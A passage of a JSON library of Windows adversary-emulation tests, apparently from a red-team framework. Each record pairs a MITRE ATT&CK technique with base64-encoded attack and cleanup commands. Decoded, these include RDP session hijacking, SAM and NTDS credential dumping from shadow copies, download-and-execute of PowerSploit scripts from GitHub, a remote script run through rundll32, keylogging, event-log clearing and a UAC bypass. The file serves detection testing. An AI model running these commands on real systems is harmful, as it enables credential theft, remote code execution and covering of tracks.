"6881a4589710d53f0c146e91db513f01", "technique_name": "Network Sniffing", "additional_info": {}, "privilege": "", "technique_id": "T1040", "platform": "windows", "name": "Windows Internal Packet Capture", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0c2ggdHJhY2Ugc3RvcCA+bnVsIDI+JjEgJiYgVElNRU9VVCAvVCA1ID5udWwgMj4mMSAmJiBkZWwgJXRlbXAlXHRyYWNlLmV0bCA+bnVsIDI+JjEgJiYgZGVsICV0ZW1wJVx0cmFjZS5jYWIgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory", "variations": []}, {"test": "cXVlcnkgdXNlciAmJiBzYy5leGUgY3JlYXRlIHNlc3NoaWphY2sgYmlucGF0aD0gImNtZC5leGUgL2sgdHNjb24gMTMzNyAvZGVzdDpyZHAtdGNwIzU1IiAmJiBuZXQgc3RhcnQgc2Vzc2hpamFjaw==", "ability_id": "153663bd4b750eca453d844cda61a37a", "technique_name": "Remote Service Session Hijacking: RDP Hijacking", "additional_info": {}, "privilege": "", "technique_id": "T1563.002", "platform": "windows", "name": "RDP hijacking", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2MuZXhlIGRlbGV0ZSBzZXNzaGlqYWNrID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n", "variations": []}, {"test": "aXBjb25maWc=", "ability_id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "Network Interface Configuration", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "View network configuration info for host", "variations": []}, {"test": "d21pYyBzaGFkb3djb3B5IGNhbGwgY3JlYXRlIFZvbHVtZT1DOlw=", "ability_id": "9f73269695e54311dd61dc68940fb3e1", "technique_name": "OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Create Volume Shadow Copy with WMI", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7ICRtYWNyb2NvZGUgPSAiICBhID0gU2hlbGwoYCJjbWQuZXhlIC9jIGNob2ljZSAvQyBZIC9OIC9EIFkgL1QgM2AiLCB2Yk5vcm1hbEZvY3VzKSI7IEludm9rZS1NYWxEb2MgLW1hY3JvQ29kZSAkbWFjcm9jb2RlIC1vZmZpY2VQcm9kdWN0ICJXb3JkIg==", "ability_id": "f6297d156d5b30fbef5212ac5f1f76ee", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "Maldoc choice flags command execution", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgR2V0LUZvcmVzdFRydXN0IC1WZXJib3Nl", "ability_id": "feb9647c55185e3b6045293fd26f6a5b", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "Get-ForestTrust with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n", "variations": []}, {"test": "TmV3LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAtTmFtZSBMb2NhbEFjY291bnRUb2tlbkZpbHRlclBvbGljeSAtUHJvcGVydHlUeXBlIERXb3JkIC1WYWx1ZSAxIC1Gb3JjZTsgTmV3LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAtTmFtZSBFbmFibGVMaW5rZWRDb25uZWN0aW9ucyAtUHJvcGVydHlUeXBlIERXb3JkIC1WYWx1ZSAxIC1Gb3JjZTsgTmV3LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcRmlsZVN5c3RlbSIgLU5hbWUgTG9uZ1BhdGhzRW5hYmxlZCAtUHJvcGVydHlUeXBlIERXb3JkIC1WYWx1ZSAxIC1Gb3JjZQ==", "ability_id": "d2f6cb279552f1b65a9805d63eed1689", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "BlackByte Ransomware Registry Changes - Powershell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAtTmFtZSBMb2NhbEFjY291bnRUb2tlbkZpbHRlclBvbGljeSAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAtTmFtZSBFbmFibGVMaW5rZWRDb25uZWN0aW9ucyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcRmlsZVN5c3RlbSIgLU5hbWUgTG9uZ1BhdGhzRW5hYmxlZCAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n", "variations": []}, {"test": "QWRkLUNvbnRlbnQgJHByb2ZpbGUgLVZhbHVlICIiOyBBZGQtQ29udGVudCAkcHJvZmlsZSAtVmFsdWUgIlN0YXJ0LVByb2Nlc3MgY2FsYy5leGUiOyBwb3dlcnNoZWxsIC1Db21tYW5kIGV4aXQ=", "ability_id": "f9a968af61d36983448c74cca5464e17", "technique_name": "Event Triggered Execution: PowerShell Profile", "additional_info": {}, "privilege": "", "technique_id": "T1546.013", "platform": "windows", "name": "Append malicious start-process cmdlet", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JG9sZHByb2ZpbGUgPSBjYXQgJHByb2ZpbGUgfCBTZWxlY3QtT2JqZWN0IC1za2lwbGFzdCAxOyBTZXQtQ29udGVudCAkcHJvZmlsZSAtVmFsdWUgJG9sZHByb2ZpbGU="], "executor": "psh", "access": {}, "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n", "variations": []}, {"test": "bmJ0c3RhdCAtQSAje3JlbW90ZS5ob3N0LmlwfQ==", "ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Find Hostname", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find hostname of remote host", "variations": []}, {"test": "d3JpdGUtaG9zdCAiIjsgJHNoYWRvd2xpc3QgPSBnZXQtd21pb2JqZWN0IHdpbjMyX3NoYWRvd2NvcHk7ICR2b2x1bWVudW1iZXJzID0gZm9yZWFjaCgkc2hhZG93Y29weSBpbiAkc2hhZG93bGlzdCl7JHNoYWRvd2NvcHkuRGV2aWNlT2JqZWN0Wy0xXX07ICRtYXh2b2x1bWUgPSAoJHZvbHVtZW51bWJlcnMgfCBTb3J0LU9iamVjdCAtRGVzY2VuZGluZylbMF07ICRzaGFkb3dwYXRoID0gIlxcP1xHTE9CQUxST09UXERldmljZVxIYXJkZGlza1ZvbHVtZVNoYWRvd0NvcHkiICsgJG1heHZvbHVtZSArICJcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU0FNIjsgJG15ZHVtcCA9ICRFTlY6dGVtcCArICdcJyArICdteWhpdmUnOyBbU3lzdGVtLklPLkZpbGVdOjpDb3B5KCRzaGFkb3dwYXRoICwgJG15ZHVtcCk=", "ability_id": "5a484b65c247675e3b7ada4ba648d376", "technique_name": "OS Credential Dumping: Security Account Manager", "additional_info": {}, "privilege": "", "technique_id": "T1003.002", "platform": "windows", "name": "dump volume shadow copy hives with System.IO.File", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JHRvcmVtb3ZlID0gJEVOVjp0ZW1wICsgIlwiICsgJ215aGl2ZSc7IHJtICR0b3JlbW92ZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Dump hives from volume shadow copies with System.IO.File\n", "variations": []}, {"test": "bmV0IHVzZXIgQXRvbWljVXNlciBVc2VyMkRlbGV0ZVBXISAvYWRkICYmIG5ldC5leGUgdXNlciBBdG9taWNVc2VyIC9kZWxldGU=", "ability_id": "b25ae80dad74142fafb510e9c1949ace", "technique_name": "Account Access Removal", "additional_info": {}, "privilege": "", "technique_id": "T1531", "platform": "windows", "name": "Delete User - Windows", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgaWV4KGl3ciBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L2Q5NDMwMDFhN2RlZmI1ZTBkMTY1NzA4NWE3N2EwZTc4NjA5YmU1OGYvUHJpdmVzYy9Qb3dlclVwLnBzMSAtVXNlQmFzaWNQYXJzaW5nKTsgSW52b2tlLUFsbENoZWNrcw==", "ability_id": "ba763ea19604a73e3e1f9d9d8d86d9cc", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerUp Invoke-AllChecks", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvbWFzdGVyL1JlY29uL1Bvd2VyVmlldy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBHZXQtRG9tYWluUG9saWN5IC12ZXJib3Nl", "ability_id": "214be4092770061080ef0781c26bab3e", "technique_name": "Password Policy Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1201", "platform": "windows", "name": "Get-DomainPolicy with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n", "variations": []}, {"test": "R2V0LUNoaWxkSXRlbSAkZW52OlRFTVBcVDE1NTEuMDA2X3RpbWVzdG9tcC50eHQgfCAlIHsgJF8uTGFzdEFjY2Vzc1RpbWUgPSAiMDEvMDEvMTk3MCAwMDowMDowMCIgfQ==", "ability_id": "3b6b4eb9dd16a41b585bfdb8ce79ef42", "technique_name": "Indicator Removal on Host: Timestomp", "additional_info": {}, "privilege": "", "technique_id": "T1070.006", "platform": "windows", "name": "Windows - Modify file last access timestamp with PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxNTUxLjAwNl90aW1lc3RvbXAudHh0IC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n", "variations": []}, {"test": "JGRhdGVQYXRoID0gImNlcnR1dGlsLSQoR2V0LURhdGUgLWZvcm1hdCB5eXl5X01NX2RkKSI7IE5ldy1JdGVtIC1QYXRoICRkYXRlUGF0aCAtSXRlbVR5cGUgRGlyZWN0b3J5OyBTZXQtTG9jYXRpb24gJGRhdGVQYXRoOyBjZXJ0dXRpbCAtdmVyaWZ5Y3RsIC1zcGxpdCAtZiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmVkY2FuYXJ5Y28vYXRvbWljLXJlZC10ZWFtL21hc3Rlci9MSUNFTlNFLnR4dDsgR2V0LUNoaWxkSXRlbSB8IFdoZXJlLU9iamVjdCB7JF8uTmFtZSAtbm90bGlrZSAiKi50eHQifSB8IEZvcmVhY2gtT2JqZWN0IHsgTW92ZS1JdGVtICRfLk5hbWUgLURlc3RpbmF0aW9uIEF0b21pYy1saWNlbnNlLnR4dCB9", "ability_id": "810cb98b4ed5b3a026e48ffa35fef7e7", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "certutil download (verifyctl)", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gImNlcnR1dGlsLSQoR2V0LURhdGUgLWZvcm1hdCB5eXl5X01NX2RkKSIgLUZvcmNlIC1SZWN1cnNlIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVwzMSBBa2FnaTY0LmV4ZSI=", "ability_id": "690255f4e6c935ec3e76fa357fc499cc", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 31", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "U3luY0FwcHZQdWJsaXNoaW5nU2VydmVyLmV4ZSAibjsgU3RhcnQtUHJvY2VzcyBjYWxjLmV4ZSI=", "ability_id": "b8eb50c3a9e049df6156fd3dedef3c98", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10.\n", "variations": []}, {"test": "JGJ1ZmZlciA9IE5ldy1PYmplY3QgYnl0ZVtdIDExOyAkaGFuZGxlID0gTmV3LU9iamVjdCBJTy5GaWxlU3RyZWFtICJcXC5cQzoiLCAnT3BlbicsICdSZWFkJywgJ1JlYWRXcml0ZSc7ICRoYW5kbGUuUmVhZCgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCk7ICRoYW5kbGUuQ2xvc2UoKTsgRm9ybWF0LUhleCAtSW5wdXRPYmplY3QgJGJ1ZmZlcg==", "ability_id": "1db8479efec9b1188b14cfa138c0cf12", "technique_name": "Direct Volume Access", "additional_info": {}, "privilege": "", "technique_id": "T1006", "platform": "windows", "name": "Read volume boot sector via DOS device path (PowerShell)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 \u00ebR?NTFS\n```", "variations": []}, {"test": "U2V0LUxvY2F0aW9uICRQYXRoVG9BdG9taWNzRm9sZGVyOyAuXFQxMDU2LjAwMVxzcmNcR2V0LUtleXN0cm9rZXMucHMxIC1Mb2dQYXRoICRlbnY6VEVNUFxrZXkubG9n", "ability_id": "ab99fc1d9a235d596624363137004e55", "technique_name": "Input Capture: Keylogging", "additional_info": {}, "privilege": "", "technique_id": "T1056.001", "platform": "windows", "name": "Input Capture", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXGtleS5sb2cgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n", "variations": []}, {"test": "JHggPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTk5OTsgJHkgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTk5OTsgJHogPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTk5OTsgJHcgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gOTk5OTsgV3JpdGUtSG9zdCBIYUhhXyR4JHkkejsgOyAkZm1tID0gR2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3JzIHw/eyAkXy5PYmplY3RDbGFzcyAtbWF0Y2ggIlVzZXIiIC1hbmQgJF8uUHJpbmNpcGFsU291cmNlIC1tYXRjaCAiTG9jYWwifSB8IFNlbGVjdCBOYW1lOyA7IGZvcmVhY2goJG1lbWJlciBpbiAkZm1tKSB7OyAgICAgaWYoJG1lbWJlciAtbGlrZSAiKkFkbWluaXN0cmF0b3IqIikgezsgICAgICAgICAkYWNjb3VudCA9ICRtZW1iZXIuTmFtZSAtcmVwbGFjZSAiLitcXFwiLCIiICMgc3RyaXAgY29tcHV0ZXJuYW1lXDsgICAgICAgICAkb3JpZ2luYWxEZXNjcmlwdGlvbiA9IChHZXQtTG9jYWxVc2VyIC1OYW1lICRhY2NvdW50KS5EZXNjcmlwdGlvbjsgICAgICAgICBTZXQtTG9jYWxVc2VyIC1OYW1lICRhY2NvdW50IC1EZXNjcmlwdGlvbiAiYXRyOiRhY2NvdW50OyRvcmlnaW5hbERlc2NyaXB0aW9uIi5TdWJzdHJpbmcoMCw0OCkgIyBLZWVwIG9yaWdpbmFsIG5hbWUgaW4gZGVzY3JpcHRpb247ICAgICAgICAgUmVuYW1lLUxvY2FsVXNlciAtTmFtZSAkYWNjb3VudCAtTmV3TmFtZSAiSGFIYV8keCR5JHoiICMgUmVxdWlyZWQgZHVlIHRvIGxlbmd0aCBsaW1pdGF0aW9uOyAgICAgICAgIFdyaXRlLUhvc3QgIlN1Y2Nlc3NmdWxseSBSZW5hbWVkICRhY2NvdW50IEFjY291bnQgb24gIiAkRW52OkNPTVBVVEVSTkFNRTsgICAgICAgICB9OyAgICAgfQ==", "ability_id": "778e76984e52af739eff58d6cce22f42", "technique_name": "Account Manipulation", "additional_info": {}, "privilege": "", "technique_id": "T1098", "platform": "windows", "name": "Admin Account Manipulate", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGxpc3QgPSBHZXQtTG9jYWxVc2VyIHw/eyRfLkRlc2NyaXB0aW9uIC1saWtlICJhdHI6KiJ9OyBmb3JlYWNoKCR1IGluICRsaXN0KSB7OyAgICR1LkRlc2NyaXB0aW9uIC1tYXRjaCAiYXRyOig/PE5hbWU+W147XSspOyg/PERlc2NyaXB0aW9uPi4qKSI7ICAgU2V0LUxvY2FsVXNlciAtTmFtZSAkdS5OYW1lIC1EZXNjcmlwdGlvbiAkTWF0Y2hlcy5EZXNjcmlwdGlvbjsgICBSZW5hbWUtTG9jYWxVc2VyIC1OYW1lICR1Lk5hbWUgLU5ld05hbWUgJE1hdGNoZXMuTmFtZTsgICBXcml0ZS1Ib3N0ICJTdWNjZXNzZnVsbHkgUmV2ZXJ0ZWQgQWNjb3VudCAkKCR1Lk5hbWUpIHRvICQoJE1hdGNoZXMuTmFtZSkgb24gIiAkRW52OkNPTVBVVEVSTkFNRTsgfQ=="], "executor": "psh", "access": {}, "description": "Manipulate Admin Account Name\n", "variations": []}, {"test": "Q2xlYXItRXZlbnRsb2cgU2VjdXJpdHk7Q2xlYXItRXZlbnRsb2cgU3lzdGVtOw==", "ability_id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608", "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "additional_info": {}, "privilege": "Elevated", "technique_id": "T1070.001", "platform": "windows", "name": "Clear Logs", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]", "variations": []}, {"test": "TW91bnQtRGlza0ltYWdlIC1JbWFnZVBhdGggIjVmYWQzZV9UMTU1My4wMDUuaXNvIg==", "ability_id": "f210745005c4b77c38319fee8987eb15", "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass", "additional_info": {}, "privilege": "", "technique_id": "T1553.005", "platform": "windows", "name": "Mount ISO image", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["5fad3e_T1553.005.iso", "5fad3e_T1553.005.iso"], "cleanup": ["RGlzbW91bnQtRGlza0ltYWdlIC1JbWFnZVBhdGggIjVmYWQzZV9UMTU1My4wMDUuaXNvIiB8IE91dC1OdWxs", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI1ZmFkM2VfVDE1NTMuMDA1LmlzbyI="], "executor": "psh", "access": {}, "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n", "variations": []}, {"test": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XG1zYnVpbGQuZXhlIGY4ZWQ4Yl92Yi54bWw=", "ability_id": "3dac55edd5b51fc7238dc3fdc7311a65", "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild", "additional_info": {}, "privilege": "", "technique_id": "T1127.001", "platform": "windows", "name": "MSBuild Bypass Using Inline Tasks (VB)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["f8ed8b_vb.xml"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIGphdmFzY3JpcHQ6IlwuLlxtc2h0bWwsUnVuSFRNTEFwcGxpY2F0aW9uICI7ZG9jdW1lbnQud3JpdGUoKTtHZXRPYmplY3QoInNjcmlwdDpodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmVkY2FuYXJ5Y28vYXRvbWljLXJlZC10ZWFtL21hc3Rlci9hdG9taWNzL1QxMjE4LjAxMS9zcmMvVDEyMTguMDExLnNjdCIpLkV4ZWMoKTs=", "ability_id": "1b9270792bdd3c369a17a2e21bf0e092", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 execute JavaScript Remote Payload With GetObject", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.\n", "variations": []}, {"test": 